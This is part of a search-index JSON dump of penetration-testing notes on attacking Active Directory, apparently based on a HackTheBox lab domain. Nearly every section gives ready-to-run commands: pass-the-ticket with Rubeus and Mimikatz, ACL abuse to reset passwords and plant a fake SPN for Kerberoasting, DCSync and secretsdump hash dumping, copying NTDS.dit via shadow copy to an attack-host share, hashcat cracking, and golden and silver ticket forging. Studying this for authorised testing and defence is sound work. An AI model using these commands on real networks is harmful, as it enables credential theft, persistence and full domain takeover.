&lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#pass-the-ticket-ptt","title":"Pass the Ticket (PtT)","text":"<ul> <li>https://lisandre.com/archives/14885</li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows</li> </ul> <p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p> <p>With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus-pass-the-ticket","title":"Rubeus Pass the Ticket","text":"<pre><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt\n</code></pre> <p>Note that now it displays Ticket successfully imported!.</p> <p>Another way is to import the ticket into the current session using the .kirbi file from the disk.</p> <p>Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus-pass-the-ticket-using-kirbi","title":"Rubeus - Pass the Ticket using kirbi","text":"<pre><code>&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\n</code></pre> <p>We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#convert-kirbi-to-base64-format","title":"Convert .kirbi to Base64 Format","text":"<pre><code>PS &gt; [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"))\n</code></pre> <p>Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#pass-the-ticket-base64-format","title":"Pass the Ticket - Base64 Format","text":"<pre><code>&gt; Rubeus.exe ptt /ticket: &lt;Ticket&gt;\n</code></pre> <p>Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz-pass-the-ticket-using-kirbi","title":"Mimikatz - Pass the Ticket using kirbi","text":"<pre><code>&gt; mimikatz.exe \n&gt; privilege::debug\n&gt; kerberos::ptt \"C:\\Users\\plaintext\\Desktop\\Mimikatz\\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"\n&gt; exit\n</code></pre> <p>Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#pass-the-ticket-with-powershell-remoting","title":"Pass The Ticket with PowerShell Remoting","text":"<p>To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz-powershell-remoting-with-pass-the-ticket","title":"Mimikatz - PowerShell Remoting with Pass the Ticket","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; kerberos::ptt \"C:\\Users\\Administrator.WIN01\\Desktop\\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi\"\n&gt; exit\n&gt; powershell\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus-powershell-remoting-with-pass-the-ticket","title":"Rubeus - PowerShell Remoting with Pass the Ticket","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#create-a-sacrificial-process-with-rubeus","title":"Create a Sacrificial Process with Rubeus","text":"<pre><code>&gt; Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\n</code></pre> <p>The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus-pass-the-ticket-for-lateral-movement","title":"Rubeus - Pass the Ticket for Lateral Movement","text":"<pre><code>&gt; Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt\n&gt; powershell\n&gt; Enter-PSSession -ComputerName DC01\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-impacket-tools","title":"Using Impacket Tools","text":"<p>With ccache file obtained Passing the Key or Overpassing the Hash, to execute impacket tools, the ccache file needs to be exported to  environment variable.</p> <pre><code>$ ticketConverter.py &lt;kirbi||ccache&gt; &lt;kirbi||ccache&gt;\n$ export KRB5CCNAME=&lt;path_to_ticket&gt;.ccache\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#permissions-move","title":"Permissions Move","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#acl-enumeration","title":"ACL Enumeration","text":"<p>Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the \"low hanging fruit\" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p> <p></p> <p>ForceChangePassword abused with Set-DomainUserPassword Add Members abused with Add-DomainGroupMember GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember GenericWrite abused with Set-DomainObject WriteOwner abused with Set-DomainObjectOwner WriteDACL abused with Add-DomainObjectACL AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember Addself abused with Add-DomainGroupMember</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-acls-with-bloodhound","title":"Enumerating ACLs with BloodHound","text":"<p>Next, we can set the  user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-acls-with-powerview","title":"Enumerating ACLs with PowerView","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-find-interestingdomainacl","title":"Using Find-InterestingDomainAcl","text":"<pre><code>PS &gt; Find-InterestingDomainAcl\n</code></pre> <p>We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.</p> <p>Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-get-domainobjectacl","title":"Using Get-DomainObjectACL","text":"<pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; $sid = Convert-NameToSid &lt;USERNAME&gt;\nPS &gt; Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#performing-a-reverse-search-mapping-to-a-guid-value","title":"Performing a Reverse Search &amp; Mapping to a GUID Value","text":"<pre><code>PS &gt; $guid= \"&lt;ObjectAceType&gt;\"\nPS &gt; Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-the-resolveguids-flag","title":"Using the -ResolveGUIDs Flag","text":"<pre><code>PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#creating-a-list-of-domain-users","title":"Creating a List of Domain Users","text":"<pre><code>PS &gt; Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#a-useful-foreach-loop","title":"A Useful foreach Loop","text":"<pre><code>PS &gt; foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#further-enumeration-of-rights-using-damundsen","title":"Further Enumeration of Rights Using damundsen","text":"<pre><code>PS &gt; $sid2 = Convert-NameToSid damundsen\nPS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#investigating-the-help-desk-level-1-group-with-get-domaingroup","title":"Investigating the Help Desk Level 1 Group with Get-DomainGroup","text":"<pre><code>PS &gt; Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#investigating-the-information-technology-group","title":"Investigating the Information Technology Group","text":"<pre><code>PS &gt; $itgroupsid = Convert-NameToSid \"Information Technology\"\nPS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#looking-for-interesting-access","title":"Looking for Interesting Access","text":"<pre><code>PS &gt; $adunnsid = Convert-NameToSid adunn \nPS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#acl-abuse-tactics","title":"ACL Abuse Tactics","text":"<pre><code>PS &gt; Import-Module .\\PowerView.ps1\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#forcechangepassword","title":"ForceChangePassword","text":"<p>So, first, we must authenticate as  because he can force change the password of the user . We can start by opening a PowerShell console and authenticating as the  user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object. <pre><code># Creating a PSCredential Object\nPS &gt; $SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force\nPS &gt; $Cred = New-Object System.Management.Automation.PSCredential('&lt;INLANEFREIGHT&gt;\\&lt;user1&gt;', $SecPassword) \n\n# Creating a SecureString Object**\nPS &gt; $user2Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n\n# Changing the User's Password\nPS &gt; Set-DomainUserPassword -Identity user2 -AccountPassword $user2Password -Credential $Cred -Verbose\n</code></pre> <p>We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the user1 that we control. </p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#add-domaingroupmember","title":"Add-DomainGroupMember","text":"<pre><code># Creating a SecureString Object using user2\nPS &gt; $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\nPS &gt; $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\user', $SecPassword) \n\n# Adding user2 to the Help Desk Level 1 Group\nPS &gt; Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'user2' -Credential $Cred2 -Verbose\nPS &gt; Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members\n\n# Confirming user2 was Added to the Group**\nPS &gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n</code></pre> <p>At this point, we should be able to leverage our new group membership to take control over the user3. Now, let's say that our client permitted us to change the password of the user2, but the user3 is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.</p> <p>We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast [https://github.com/ShutdownRepo/targetedKerberoast] to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#creating-a-fake-spn","title":"Creating a Fake SPN","text":"<pre><code>PS &gt; Set-DomainObject -Credential $Cred2 -Identity user3 -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n</code></pre> <pre><code>$ targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#kerberoasting-with-rubeus","title":"Kerberoasting with Rubeus","text":"<pre><code>PS &gt; .\\Rubeus.exe kerberoast /user:user3 /nowrap\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#cleanup","title":"Cleanup","text":"<pre><code># Removing the Fake SPN from user3's Account\nPS &gt; Set-DomainObject -Credential $Cred2 -Identity user3 -Clear serviceprincipalname -Verbose\n\n# Removing user2 from the Help Desk Level 1 Group\nPS &gt; Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'user2' -Credential $Cred2 -Verbose\n\n# Confirming user2 was Removed from the Group\nPS &gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'user2'} -Verbose\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#dcsync","title":"DCSync","text":"<p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p> <p>The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.</p> <p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-get-domainuser-to-view-adunns-group-membership","title":"Using Get-DomainUser to View adunn's Group Membership","text":"<pre><code>PS &gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-get-objectacl-to-check-adunns-replication-rights","title":"Using Get-ObjectAcl to Check adunn's Replication Rights","text":"<pre><code>PS &gt; $sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"\nPS &gt; Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#extracting-ntlm-hashes-and-kerberos-keys-using-secretsdumppy","title":"Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py","text":"<pre><code>$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 \n\n# NTLM authentication\n$ secretsdump.py -outputfile inlanefreight_hashes &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt; \n\n# Hash authentication\n$ secretsdump.py -outputfile inlanefreight_hashes -hash &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DC_IP&gt; \n\n# Kerberos authentication\n$ secretsdump.py -outputfile inlanefreight_hashes -no-pass -k &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DC_IP&gt; \n</code></pre> <p>We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user  to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as: <p>If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-runasexe","title":"Using runas.exe","text":"<pre><code>&gt; runas /netonly /user:INLANEFREIGHT\\adunn powershell\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#performing-the-attack-with-mimikatz","title":"Performing the Attack with Mimikatz","text":"<pre><code>PS &gt; .\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#domain-admin","title":"Domain Admin","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#dump-ntdsdit","title":"Dump NTDS.dit","text":"<p>In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.</p> <p>Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.</p> <p>Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#capturing-ntdsdit","title":"Capturing NTDS.dit","text":"<p>NT Directory Services (NTDS) is the directory service used with AD to find &amp; organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.</p> <p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#checking-user-account-privileges-including-domain","title":"Checking User Account Privileges including Domain","text":"<ul> <li><code>net user bwilliamson</code></li> </ul>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#creating-shadow-copy-of-c","title":"Creating Shadow Copy of C:","text":"<p>We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup &amp; disaster recovery software to perform operations.</p> <ul> <li><code>vssadmin CREATE SHADOW /For=C:</code></li> </ul>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#copying-ntdsdit-from-the-vss","title":"Copying NTDS.dit from the VSS","text":"<p>We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.</p> <ul> <li><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit</code></li> </ul>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#transferring-ntdsdit-to-attack-host","title":"Transferring NTDS.dit to Attack Host","text":"<p>Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host. - <code>cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData</code></p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#crackmapexec","title":"CrackMapExec","text":"<p>Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p> <pre><code>$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#impacket","title":"Impacket","text":"<pre><code>$ secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; \n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#cracking-hashes-gaining-credentials","title":"Cracking Hashes &amp; Gaining Credentials","text":"<p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.</p> <ul> <li><code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#persistence","title":"Persistence","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#goldticket","title":"GoldTicket","text":"<ul> <li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden </li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket</li> </ul>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz_1","title":"Mimikatz","text":"<pre><code># with an NT hash\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt\n\n# with an AES 128 key\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt\n\n# with an AES 256 key\nkerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus","title":"Rubeus","text":"<pre><code>.\\Rubeus.exe ptt /ticket:ticket.kirbi\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#remote","title":"Remote","text":"<pre><code>PS &gt; import-module .\\PowerView.ps1\nPS &gt; Get-DomainSID\n</code></pre> <pre><code># Create the golden ticket (with an RC4 key, i.e. NT hash)\n$ ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser\n\n# Create the golden ticket (with an AES 128/256bits key)\n$ ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser\n\n# Set the ticket for impacket use\n$ export KRB5CCNAME=&lt;TGS_ccache_file&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#silverticket","title":"SilverTicket","text":"<ul> <li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver</li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</li> </ul> <p>The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#generate-the-rc4-hash-from-password","title":"Generate the RC4 hash from password","text":"<pre><code>&gt; mimikatz.exe\n&gt; kerberos::hash /password:MyPassword\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz_2","title":"Mimikatz","text":"<pre><code># To generate the TGS with NTLM\n&gt; kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;\n\n# To generate the TGS with AES 128 key\n&gt; kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;\n\n# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)\n&gt; kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt; \n\n# Inject TGS with Mimikatz\n&gt; kerberos::ptt &lt;ticket_kirbi_file&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus_1","title":"Rubeus","text":"<pre><code>&gt; .\\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#remote_1","title":"Remote","text":"<pre><code>$ ticketer.py -nthash $NTLM -domain-sid $DOMAIN_SID -domain $DOMAIN &lt;USER&gt;\n\n# To generate the TGS with NTLM\n$ python ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;\n\n# To generate the TGS with AES key\n$ python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;\n\n# Set the ticket for impacket use\n$ export KRB5CCNAME=&lt;TGS_ccache_file&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/DomainEnumeration/","title":"Domain Enumeration","text":""},{"location":"zNew/ActiveDirectory/01-NoCredentials/DomainEnumeration/#identifying-hosts","title":"Identifying Hosts","text":"<pre><code>$ sudo -E wireshark\n</code></pre> <pre><code>$ sudo tcpdump -i ens224 \n</code></pre> <pre><code>$ sudo responder -I ens224 -A \n</code></pre> <pre><code>$ fping -asgq 172.16.5.0/23\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/DomainEnumeration/#scan-alive-hosts","title":"Scan Alive hosts","text":"<p>focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few.</p> <pre><code>$ sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/","title":"Making a Target User List","text":"<ul> <li>By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller</li> <li>Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list</li> <li>Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users</li> <li>Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist</li> </ul>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#smb-null-session-to-pull-user-list","title":"SMB NULL Session to Pull User List","text":"<p>If you are on an internal machine but don\u2019t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.</p> <p>It\u2019s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don\u2019t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.</p> <p>Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#using-enum4linux","title":"Using enum4linux","text":"<pre><code>$ enum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#using-rpcclient","title":"Using rpcclient","text":"<pre><code>$ rpcclient -U \"\" -N 172.16.5.5\nrpcclient $&gt; enumdomusers \n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#using-crackmapexec","title":"Using CrackMapExec","text":"<pre><code>$ crackmapexec smb 172.16.5.5 --users\n\n# 